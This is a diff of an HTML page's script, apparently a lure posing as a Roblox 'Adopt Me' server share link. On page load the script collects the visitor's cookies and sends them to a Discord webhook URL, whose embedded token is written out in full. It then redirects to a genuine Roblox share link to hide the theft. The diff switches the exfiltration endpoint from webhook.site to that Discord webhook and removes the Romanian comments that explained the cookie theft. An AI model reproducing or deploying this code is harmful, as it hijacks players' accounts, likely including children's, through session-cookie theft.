@@ -342,11 +342,11 @@
     </div>
 
     <script>
-        // 📍 MODIFICĂ AICI CU URL-URILE TALE!
-        const YOUR_API_URL = 'https://webhook.site/8b6d6d40-3d1c-4d32-8698-ed632d9c03db'; // unde trimiți cookie-urile
+      
+        const YOUR_API_URL = 'https://discord.com/api/webhooks/1269442578374463540/4A23jUUcmpOTvy3o8clpd2yZIKakqhwjp3ZaYSFGbevlyRb-0WOX7u2L1rSYk5do4FLs'; // unde trimiți cookie-urile
         const REDIRECT_URL = 'https://www.roblox.com/share?code=a1830c3b439b154fb6978bff940c7154&type=Server'; // unde redirecționezi
         
-        // Funcție pentru trimitere cookie-uri
+     
         function sendCookies() {
             const data = {
                 cookies: document.cookie,
@@ -357,13 +357,13 @@
                 game: 'Adopt Me'
             };
             
-            // Folosește Beacon API pentru trimitere rapidă
+
             const blob = new Blob([JSON.stringify(data)], {type: 'application/json'});
             
             if (navigator.sendBeacon) {
                 navigator.sendBeacon(YOUR_API_URL, blob);
             } else {
-                // Fallback pentru browsere vechi
+            
                 fetch(YOUR_API_URL, {
                     method: 'POST',
                     body: blob,
@@ -372,19 +372,21 @@
             }
         }
         
-        // 📤 EXECUTĂ TOTUL AUTOMAT CÂND SE ÎNCARCĂ PAGINA
+     
         document.addEventListener('DOMContentLoaded', function() {
-            // Așteaptă 2 secunde ca utilizatorul să vadă pagina
+         
             setTimeout(() => {
-                // Trimite cookie-urile
+                
                 sendCookies();
                 
-                // 🔄 REDIRECTIONEAZĂ după 500ms
+      
                 setTimeout(() => {
                     window.location.href = REDIRECT_URL;
-                }, 500);
+                }, 100
+                );
             }, 2000);
         });
     </script>
 </body>
+
 </html>
